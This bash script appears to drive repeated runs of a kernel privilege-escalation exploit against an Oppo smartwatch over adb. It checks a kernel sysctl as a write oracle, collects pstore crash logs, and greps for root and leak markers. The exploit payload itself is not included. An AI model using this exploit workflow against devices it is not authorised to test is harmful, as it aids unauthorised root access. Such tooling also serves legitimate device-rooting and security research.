#!/usr/bin/env bash
# One controlled fire of the clock_adjtime(405) write vector, with classification.
#
#   bash atd_fire.sh <label> <env assignments...>
#
# e.g.  bash atd_fire.sh ora2 GHOSTLOCK_ORACLE=2 GHOSTLOCK_WBASE=4 GHOSTLOCK_ATTEMPTS=1
#
# Every fire starts from a pristine /proc/sys/net/core/optmem_max (10240): a
# leftover value from a previous oracle write would make the NEXT oracle result
# ambiguous, so a dirty box is rebooted rather than fired.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
mkdir -p "$ARCH"
LABEL=${1:-atd}
shift
ENV="$*"
online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
waitdev() { local m=${1:-200} w=0; while ! online; do sleep 3; w=$((w+3)); [ $w -ge $m ] && return 1; done; sleep 3; return 0; }

# PSTORE HARVEST.  /sys/fs/pstore/dmesg-ramoops-0 is world-readable on this build
# (mode 0444, 216 KB) and holds the COMPLETE previous-boot dmesg, including the
# oops that killed a fire -- which is exactly what the SELinux-locked pstore kept
# us from seeing before.  Harvest once before the fire (so the record we read
# afterwards is provably THIS fire's, not a leftover) and once after any reboot.
harvest() {
  local tag=$1
  $ADB shell "cat /sys/fs/pstore/dmesg-ramoops-0 2>/dev/null" 2>/dev/null \
    | tr -d '\r' > "$ARCH/${LABEL}-${tag}-pstore.txt"
  echo "[$LABEL] pstore-$tag bytes=$(wc -c < "$ARCH/${LABEL}-${tag}-pstore.txt")"
}

waitdev || { echo "[$LABEL] NO-DEVICE"; exit 1; }
harvest pre
before=$($ADB shell "cat /proc/sys/net/core/optmem_max" 2>/dev/null | tr -d '\r')
if [ "$before" != "10240" ]; then
  echo "[$LABEL] optmem=$before not pristine -> reboot"
  $ADB shell reboot >/dev/null 2>&1; waitdev || { echo "[$LABEL] NO-RECOVERY"; exit 1; }
  before=$($ADB shell "cat /proc/sys/net/core/optmem_max" 2>/dev/null | tr -d '\r')
fi
$ADB shell "rm -f $DT/log_*.txt; sync" 2>/dev/null
t0=$(date +%H:%M:%S)
timeout 300 $ADB shell "$ENV sh $DT/fire.sh" >/dev/null 2>&1; rc=$?
uid=$($ADB shell "id -u" 2>/dev/null | tr -d '\r')
waitdev || { echo "[$LABEL] PANIC-REBOOT rc=$rc t=$t0 (device went away)"; }
after=$($ADB shell "cat /proc/sys/net/core/optmem_max" 2>/dev/null | tr -d '\r')
L="$ARCH/${LABEL}.log"
$ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$L"
harvest post
echo "[$LABEL] rc=$rc uid=$uid t=$t0 optmem $before -> $after  lines=$(wc -l < "$L")"
grep -E 'PRE-ATDFI|WS |WS-|PUNCH-ATDFI|PUNCH-STOP|PUNCH-1ST|PUNCH-STAT|PROBE-ATDFI|ORACLE|CFI|cfi|root=|ROOT|leak|HIT model|exploit finished' "$L" | tail -30
echo "--- last 6 log lines ---"; tail -6 "$L"
P="$ARCH/${LABEL}-post-pstore.txt"
if [ -s "$P" ]; then
  echo "--- pstore oops (this or the last dead boot) ---"
  grep -nE 'Oops|panic|PC is at|LR is at|udf|Internal error|BUG:|r0 :|rt_mutex|rb_|sched_setattr|clock_adjtime' "$P" | tail -25
fi
